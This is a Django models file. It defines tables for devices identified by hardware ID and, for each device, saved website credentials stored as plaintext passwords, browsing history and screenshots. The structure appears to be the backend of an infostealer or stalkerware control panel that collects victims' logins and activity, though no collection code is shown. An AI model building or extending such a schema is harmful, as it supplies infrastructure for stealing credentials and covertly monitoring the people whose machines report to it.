from django.db import models
from django.contrib.auth.models import AbstractUser

class CustomUser(AbstractUser):
    email = models.EmailField(unique=False, null=True, blank=True) 

class Devices(models.Model):
    hardware_id = models.CharField(max_length=255, primary_key=True, db_column='hardware_id')
    CPU = models.TextField(null=True, blank=True)
    RAM = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True)
    GPU = models.TextField(null=True, blank=True)
    DISK_CAPACITY = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True)
    OS_VERSION = models.TextField(null=True, blank=True)
    
    def __str__(self):
        return self.hardware_id
    
    class Meta:
        verbose_name = 'Device'
        verbose_name_plural = 'Devices' 
    
class Passwords(models.Model):
    device = models.ForeignKey(Devices, on_delete=models.CASCADE, related_name='passwords', to_field='hardware_id')
    website = models.TextField(null=True, blank=True)  
    username = models.TextField(null=True, blank=True)
    password = models.TextField(null=True, blank=True)
    
    class Meta:
        verbose_name = 'Password'
        verbose_name_plural = 'Passwords'  
    
class History(models.Model):
    device = models.ForeignKey(Devices, on_delete=models.CASCADE, related_name='history', to_field='hardware_id')
    title = models.TextField(null=True, blank=True)
    url = models.TextField(null=True, blank=True)
    visited = models.DateTimeField(null=True, blank=True)
    
    class Meta:
        verbose_name = 'History'
        verbose_name_plural = 'History'  
    
class Screenshot(models.Model):
    device = models.ForeignKey(Devices, on_delete=models.CASCADE, related_name='screenshot', to_field='hardware_id')
    created_at = models.DateTimeField(null=True, blank=True)
    data = models.TextField(null=True, blank=True) 
    
    class Meta:
        verbose_name = 'Screenshot'
        verbose_name_plural = 'Screenshots'  
    
